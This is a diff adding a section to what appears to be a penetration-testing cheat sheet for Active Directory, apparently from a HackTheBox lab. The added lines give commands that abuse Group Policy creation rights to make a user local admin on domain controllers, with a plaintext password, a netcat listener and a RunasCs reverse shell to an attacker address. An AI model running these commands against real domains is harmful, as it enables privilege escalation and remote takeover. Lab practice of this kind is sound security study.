@@ -212,6 +212,15 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
+#### Abusing "Group Policy Creeator Owners"
+Members of this group can create and modify Group Policy Objects in the domain
+```
+New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "{GPO-Name}" --force
+gpupdate /force
+rlwrap nc -nlvp 464
+.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
+```
 #### Linux Abuse of Over large Permission Over Group and Object
 Add the user to the target group
 ```
